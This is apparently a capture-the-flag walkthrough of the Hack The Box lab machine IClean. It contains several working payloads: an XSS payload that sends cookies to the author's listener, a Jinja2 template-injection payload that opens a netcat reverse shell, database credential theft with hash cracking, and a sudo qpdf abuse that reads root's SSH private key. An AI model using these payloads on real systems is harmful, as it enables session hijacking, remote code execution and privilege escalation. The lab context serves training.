---
title: "IClean from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# IClean from HTB
[page](https://app.hackthebox.com/machines/IClean)
`Nmap` gave this:
```bash
$ nmap -sCV --min-rate 4000 -Pn 10.10.11.12
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 17:05 +04
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 87.50% done; ETC: 17:05 (0:00:00 remaining)
Nmap scan report for capiclean.htb (10.10.11.12)
Host is up (0.25s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE  SERVICE       VERSION
21/tcp   closed ftp
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   open   http          Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Capiclean
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.3.7 Python/3.10.12
110/tcp  closed pop3
139/tcp  closed netbios-ssn
199/tcp  closed smux
445/tcp  closed microsoft-ds
587/tcp  closed submission
995/tcp  closed pop3s
1025/tcp closed NFS-or-IIS
3306/tcp closed mysql
3389/tcp closed ms-wbt-server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.38 seconds
```
Nothing unusual.
First add the site to `/etc/hosts`:
```
10.10.11.12 capiclean.htb
```
Then access the site. There is send quote link. Go to that and then we have to use `XSS`to steal the cookie with `BurpSuite`:
Turn on the `Intercept`and before you send the `email`you need to intercept and change the email you send with `XSS`script to get the cookie:
```bash
<img src=x onerror=fetch("http://10.10.16.47:8888/"+document.cookie)> ----- XSS script

%3Cimg%20src%3Dx%20onerror%3Dfetch(%22http%3A%2F%2F10.10.16.47%3A8888%2F%22%2Bdocument.cookie)%3E ---- encoded XSS script

python3 -m http.server 8888 ---- simple http python server
```
`BurpSuite`payload:
```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Length: 127
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://capiclean.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Referer: http://capiclean.htb/quote
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq3t1A.JQgksxu10czAnKBw5RbDWWe_-Xk
Connection: keep-alive

service=%3Cimg%20src%3Dx%20onerror%3Dfetch(%22http%3A%2F%2F10.10.16.47%3A8888%2F%22%2Bdocument.cookie)%3E&email=test%40test.com
```
And on the `simple http server`i got the cookie:
```python
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.11.12 - - [03/Aug/2024 17:19:57] "GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq3t1A.JQgksxu10czAnKBw5RbDWWe_-Xk HTTP/1.1" 200 -
10.10.11.12 - - [03/Aug/2024 17:19:58] "GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq3t1A.JQgksxu10czAnKBw5RbDWWe_-Xk HTTP/1.1" 200 -
10.10.11.12 - - [03/Aug/2024 17:20:00] "GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq3t1A.JQgksxu10czAnKBw5RbDWWe_-Xk HTTP/1.1" 200 -
```
Go to `http://capiclean.htb/login`and with [cookieEditor](https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?hl=en) add this:![](/asets/images/Screenshot from 2024-08-03 17-25-47.png)
Then go to `http://capiclean.htb/dashboard`and go to `generateInvoice`, click generate and copy what you will get:
![](/assets/images/Screenshot from 2024-08-03 17-27-46.png)
Then go to `QRgenerator`and enter your invoice ID to get the link:
![](/assets/images/Screenshot from 2024-08-03 17-28-55.png)
After that you need to turn `intercept`on and modify what you will send. You need to get reverse shell from this.
The payload is:
```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.16.47%201234%20%3E%2Ftmp%2Ff")|attr("read")()}}
```
Here is the explanation: [chatgpt](https://chatgpt.com/share/ed81f63d-99b1-4b05-a583-b080c29b5abc)
its with my IP and port.
![](/assets/images/Screenshot from 2024-08-03 17-32-15.png)
Don't forget `NetCat`
```bash
$ nc -nlvp 1234
```
And after sending that payload in `Repeater`you will get the connection.
```bash
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.47] from (UNKNOWN) [10.10.11.12] 37226
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@iclean:/opt/app$
www-data@iclean:/opt/app$ ls
ls
app.py	static	templates
```
There is `app.py,` lets read it. At the start there is the thing we need:
```bash
www-data@iclean:/opt/app$ cat app
cat app.py
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'

```
This means that there is `Database`with password:`pxCsmnGLckUb`. I connected to it and got this:
```sql
www-data@iclean:/opt/app$ mysql -u iclean -p
mysql -u iclean -p
Enter password: pxCsmnGLckUb

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 785
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> ls
ls
    -> ;
;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ls' at line 1
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql> use capiclean
use capiclean
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
```
![](/assets/images/Screenshot from 2024-08-03 17-37-27.png)
admin ---- 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51
consuela ---- 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa
Let's crack the `consuela`password in [crackstation](https://crackstation.net/) and you will get the password:
`simple and clean`.
`admin`password is not crack-able.
Then exit `mysql`and change the user to `consuela`:
```bash
mysql> exit
exit
Bye
www-data@iclean:/opt/app$ su consuela
su consuela
Password: simple and clean

consuela@iclean:/opt/app$ $ cd /home/consuela
cd /home/consuela
consuela@iclean:~$ ls
ls
user.txt
consuela@iclean:~$ cat user.txt
cat user.txt
05fa5137fbd54cfbdb6180d933f83c89
```
***
user flag: 05fa5137fbd54cfbdb6180d933f83c89
***
Learn what we can run as root:
```bash
$ sudo -l
sudo -l
[sudo] password for consuela: simple and clean

Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```
Because there is `ssh`port open let's copy `id_rsa`of `ssh` with `qpdf`:
```bash
$ sudo /usr/bin/qpdf --empty /tmp/rsa.txt --qdf -add-attachment /root/.ssh/id_rsa --
sudo /usr/bin/qpdf --empty /tmp/rsa.txt --qdf -add-attachment /root/.ssh/id_rsa --
$ cat /tmp/rsa.txt
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```
[qpdf](https://en.wikipedia.org/wiki/QPDF)
Copy this `OPENSSH`private key to some file that you will be needing to use while connecting to `ssh`as a root.
```bash
$ cat rsa < -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
$ chmod 600 rsa
$ ssh -i rsa root@10.10.11.12
The authenticity of host '10.10.11.12 (10.10.11.12)' can't be established.
ED25519 key fingerprint is SHA256:3nZua2j9n72tMAHW1xkEyDq3bjYNNSBIszK1nbQMZfs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.12' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Aug  3 12:44:17 PM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@iclean:~# cat root.txt
09bab030cd79f2a2553346f92ddf4c49
```
***
root flag: 09bab030cd79f2a2553346f92ddf4c49
***
![](/assets/images/Screenshot from 2024-08-03 16-44-47.png)
